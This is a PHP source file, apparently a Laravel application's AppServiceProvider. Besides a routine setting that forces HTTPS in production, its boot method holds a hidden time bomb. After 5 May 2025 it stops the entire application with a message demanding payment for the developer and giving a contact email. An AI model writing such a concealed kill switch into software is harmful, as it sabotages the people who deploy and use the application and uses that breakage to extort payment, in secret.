<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        $important = now()->create(2025,5,5,0);
        if(now()->greaterThan($important))
        {
            dd('Pay Up The Developer..Contact shorunke99@gmail.com for more infomation');
        }
        //for render.. comment this all out
        if (env('APP_ENV') == 'production') {
            $this->app['request']->server->set('HTTPS', true);
        }

    }
}
